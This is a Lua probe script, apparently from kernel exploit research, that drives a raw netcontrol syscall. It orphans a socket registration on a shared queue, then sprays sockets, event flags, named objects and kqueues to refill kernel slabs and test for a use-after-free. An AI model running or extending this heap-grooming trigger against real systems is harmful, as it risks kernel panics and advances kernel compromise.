-- CRASH_CLASS: HIGH
-- PROBE 232a: is the dead queue holding a reference or a raw pointer
--
-- Context, all measured on the previous boot: `ifindex -1` on `99 netcontrol`
-- addresses one shared queue object with a single owner. Register a socket on
-- it -> 0, close that socket while registered, and from then on every register
-- on -1 returns -1 - in that process, in a later loader process, and until a
-- reboot. Ordinary indexes are untouched by the same sequence (230a), and a
-- rejected call does not poison the descriptor (231a).
--
-- A queue that refuses forever is a queue that still names the socket that
-- died. Either it holds a reference - the socket is immortal, the queue is
-- simply unusable, and the whole line is a leak - or it holds a raw pointer and
-- every later register walks freed memory.
--
-- This probe separates those by changing what occupies that memory:
--
--   [A] clean baseline on -1.
--   [B] the orphan: register, close, no clear. The next register must fail.
--   [C] reclaim: many sockets, event flags and named objects, so whatever slab
--       the closed socket came from is refilled.
--   [D] register on -1 again. If the refusal was a dereference of reclaimed
--       memory it can change here; if it stays -1 under a full refill, the queue
--       is holding the socket alive rather than pointing at it.
--
-- RISK: the register path is the one that would dereference freed memory. A
-- fault in kernel context is a panic.

print("=== PROBE 232a: reference or raw pointer ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function u64(v)
    if type(v) == "number" then
        if v < 0 then v = 0x100000000 + v end
        return uint64(string.format("0x%08X", v))
    end
    return v
end
local function sgn(v)
    if v == nil then return "killed" end
    if v >= 0x80000000 then return tostring(v - 0x100000000) end
    return tostring(v)
end
local dead = false

local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, ret = pcall(function()
        return sc(u64(a1 or 0), u64(a2 or 0), u64(a3 or 0), u64(a4 or 0), u64(a5 or 0), u64(a6 or 0))
    end)
    if not ok then
        dead = true
        return nil, nil
    end
    return ret, to_num(ret)
end

local BUF = memory.alloc(0x20)
local function zero(addr, n)
    for i = 0, n - 1, 4 do
        pcall(function() memory.write_dword(addr + i, 0) end)
    end
end
local function wd(addr, v)
    return (pcall(function() memory.write_dword(addr, v) end))
end

local SET_QUEUE = 0x20000003
local CLEAR_QUEUE = 0x20000007

local function pid()
    local _, v = call(20)
    return sgn(v)
end
local function reg(ifindex, fd, cmd)
    zero(BUF, 0x10)
    wd(BUF, fd)
    local _, v = call(99, ifindex, cmd, BUF, 8)
    return v
end
local function sock()
    local _, s = call(97, 1, 1, 0)
    return s
end

print("    pid " .. pid())
print("")

print("[A] baseline on -1")
local a = sock()
local clean = false
if a ~= nil and a >= 0 and not dead then
    local r = reg(-1, a, SET_QUEUE)
    local c = (r == 0) and reg(-1, a, CLEAR_QUEUE) or nil
    print(string.format("    fd %s register %s%s", sgn(a), sgn(r), c ~= nil and (" clear " .. sgn(c)) or ""))
    clean = (r == 0 and c == 0)
    call(6, a)
end
print("")

if not clean then
    print("[B] skipped: -1 is not clean, this run would prove nothing")
else
    print("[B] orphan on -1: register, close, no clear")
    local b = sock()
    if b ~= nil and b >= 0 and not dead then
        print(string.format("    fd %s register -> %s", sgn(b), sgn(reg(-1, b, SET_QUEUE))))
        local _, bc = call(6, b)
        print("    close -> " .. sgn(bc))
        local probe = sock()
        if probe ~= nil and probe >= 0 then
            print(string.format("    control fd %s register -> %s", sgn(probe), sgn(reg(-1, probe, SET_QUEUE))))
            call(6, probe)
        end
    end
    print("")

    print("[C] refill the slabs: sockets, event flags, named objects, kqueues")
    local socks, evfs, nobjs, kqs = 0, 0, 0, 0
    local NAME = memory.alloc(16)
    wd(NAME, 0x41424344)
    for i = 1, 96 do
        if dead then break end
        local s = sock()
        if s ~= nil and s >= 0 then socks = socks + 1 end
    end
    for i = 1, 32 do
        if dead then break end
        local _, h = call(538, NAME, 0, 0)
        if h ~= nil and h > 0 then evfs = evfs + 1 end
    end
    for i = 1, 32 do
        if dead then break end
        local _, h = call(557, NAME, 0, 0)
        if h ~= nil and h > 0 then nobjs = nobjs + 1 end
    end
    for i = 1, 8 do
        if dead then break end
        local _, k = call(362)
        if k ~= nil and k >= 0 then kqs = kqs + 1 end
    end
    print(string.format("    sockets %d  evf %d  namedobj %d  kqueue %d  pid %s",
        socks, evfs, nobjs, kqs, pid()))
    print("")

    print("[D] register on -1 after the refill")
    local d = sock()
    if d ~= nil and d >= 0 and not dead then
        print(string.format("    fd %s register -> %s", sgn(d), sgn(reg(-1, d, SET_QUEUE))))
        print(string.format("    fd %s clear    -> %s", sgn(d), sgn(reg(-1, d, CLEAR_QUEUE))))
    end
    print("    pid -> " .. pid())
end
print("")
print("=== PROBE 232a COMPLETE ===")
